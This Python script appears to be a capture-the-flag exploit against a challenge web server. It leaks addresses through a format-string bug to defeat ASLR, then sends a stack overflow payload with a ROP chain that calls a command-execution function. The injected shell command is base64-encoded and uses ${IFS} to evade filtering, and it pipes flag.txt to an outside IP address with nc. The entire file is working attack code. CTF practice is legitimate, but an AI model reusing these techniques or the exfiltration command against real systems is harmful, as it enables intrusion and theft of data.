#!/usr/bin/env python3
import requests
import json
import socket
import ssl
import base64
from pwn import p64

# Address
HOSTNAME = "summit-8083c41f607b0c894ae9735455191119-0.chals.io"
PORT = 443

def simple_web_client(path=b'/'):
    if (PORT == 443):
        return simple_web_client_ssl(path)
    else:
        return simple_web_client_http(path)

def simple_web_client_http(path=b"/"):
    # Create a TCP socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Connect to the server
        s.connect((HOSTNAME, PORT))
        # Prepare the GET request
        request = b"GET " + path + b" HTTP/1.0\r\n\r\n"
        # Send the request
        s.sendall(request)

        # Receive the response
        response = b""
        while True:
            chunk = s.recv(1024)
            if not chunk:
                break
            response += chunk

    return response

def simple_web_client_ssl(path):
    # Create a TCP socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # Wrap the socket with SSL/TLS
        context = ssl.create_default_context()
        with context.wrap_socket(s, server_hostname=HOSTNAME) as ssl_sock:
            # Connect to the server
            ssl_sock.connect((HOSTNAME, PORT))

            # Prepare the GET request
            request = b"GET " + path + b" HTTP/1.0\r\nHost: " + HOSTNAME.encode() + b"\r\n\r\n"

            # Send the request
            ssl_sock.sendall(request)

            # Receive the response
            response = b""
            while True:
                chunk = ssl_sock.recv(1024)
                if not chunk:
                    break
                response += chunk

    return response

def generate_shell_command(payload):
    # Encode the payload as base64
    encoded_payload = base64.b64encode(payload.encode()).decode()

    # Create the shell command
    shell_command = f"echo${{IFS}}'{encoded_payload}'|base64${{IFS}}-d|sh\x00"
    return shell_command

# Address where the return pointer is on the stack in the read_file function
RET_OFFSET = 264

# Helper for our information leak and ASLR defeat
HANDLE_DEBUG_RETURN_ADDRESS = 0x102e55

# The function we want to call
EXECUTE_COMMAND_ADDRESS = 0x102452

# This pops an address on the stack into RDI
POP_RDI_RET_GADGET = 0x103d15

# Do the information leak
resp = simple_web_client(b"/api/debug/stats/%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx_%lx").decode().split("\r\n")[-1]
a = json.loads(resp.encode("utf-8"))
arr = a['path'].split("_")
leak1 = int('0x' + arr[-1].strip(), 16)
leak2 = int('0x' + arr[-3].strip(), 16)

print(f"Leaked debug return address: {hex(leak1)}")
print(f"Leaked stack address: {hex(leak2)}")

base_address = leak1 - HANDLE_DEBUG_RETURN_ADDRESS

print(f"Base address: {hex(base_address)}")

CMD = generate_shell_command("cat flag.txt | nc 3.235.169.62 31337").encode()
payload = b"/" + b"l"*31 + CMD + b"x"*(241-len(CMD)) + p64(POP_RDI_RET_GADGET + base_address) + p64(leak2) + p64(EXECUTE_COMMAND_ADDRESS + base_address)
resp = simple_web_client(payload)
